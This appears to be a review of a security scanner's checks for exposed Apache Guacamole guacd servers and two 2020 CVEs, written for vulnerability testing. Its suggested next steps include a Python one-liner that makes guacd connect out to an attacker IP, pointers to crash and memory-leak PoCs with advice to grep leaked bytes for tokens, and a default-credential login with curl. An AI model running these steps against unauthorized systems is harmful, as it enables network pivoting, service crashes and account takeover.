summary: Complete guacd wire speaker: encode/decode of the LENGTH.VALUE opcode, sends select,<backend> per protocol and records which backends return `args` (built-in plugins). Extracts VERSION_x_y_z from args frames and gates two version-bracket CVEs (2020-9497/9498). Strong T1 for exposure (any response off-loopback proves no-auth reachability, which is the whole vuln); CVEs are T0 today (banner-derived). Biggest gap: no SSRF-pivot proof - never actually asks guacd to connect outward to a canary IP:port to prove the pivot works; the CVE claims are unvalidated version brackets with no memory-corruption or leak probe.

findings.title_pattern: guacd reachable off-loopback (no authentication, arbitrary pivot)
findings.tier_evidence: Server answered `select,vnc` with an `args` opcode - deterministic proof that guacd is reachable and has no authentication of its own (which is by design). One roundtrip, non-destructive.
findings.promotion_notes: Full T2 SSRF proof: after `select,rdp`, send the `size,audio,video,image,timezone,args` handshake with hostname=<attacker-canary-ip>, port=<canary-port>, and observe an inbound TCP connect on the canary listener. Wire that through relay_targets to mark reachable internal RDP/VNC/SSH/kubernetes targets guacd can route to.
findings.tester_next_step: python3 -c 'import socket;s=socket.create_connection(("<ip>",<port>));s.sendall(b"6.select,3.rdp;");print(s.recv(4096));s.sendall(b"4.size,4.1024,3.768,2.96;5.audio,0;5.video,0;5.image,0;8.timezone,0;8.hostname,15.<attacker-ip>,4.port,4.3389,7.security,3.any;");print(s.recv(4096))'   # watch tcpdump -ni any port 3389 on the attacker

findings.tier_evidence: Fires purely on VERSION_x_y_z parsed from the args frame + strict-less-than 1.2.0. No UAF probe, no crash trigger.
findings.promotion_notes: Send the crafted static-virtual-channel RDP frame from the Check Point 'Reverse RDP' PoC (guac_common_svc_process_receive UAF) and look for a service restart / socket close within the window. Full T3 needs a shellcode payload; keep T2 as 'crash observed'.
findings.tester_next_step: See Check Point 2020-07-02 write-up 'Reverse RDP - The Path Not Taken'; PoC at github.com/checkpoint-research/CVE-2020-9498. Lab-only - it heap-corrupts guacd.

findings.tier_evidence: Same version-bracket gate as 9498; no leak probe.
findings.promotion_notes: Send the length-mismatched SVC packet from the disclosed PoC and search the returned bytes for likely session-token / heap-pointer material. Non-destructive but noisy in guacd logs.
findings.tester_next_step: Same Check Point research repo - the mem-disclosure variant of the crafted SVC frame; grep the leaked bytes for JSESSIONID / bearer strings.

findings.tier_evidence: Version + supported-backends enumeration; no vuln claim.
findings.promotion_notes: Correct as info. The `backends_ok` list feeds the exposed finding's detail and could feed relay_targets to say 'this guacd can route to RDP/SSH/kubernetes'.
findings.tester_next_step: curl -sk https://<ip>:8443/guacamole/api/tokens -d 'username=guacadmin&password=guacadmin'   # co-located web tier often ships with default creds; a token here is a full T3 into every registered connection.
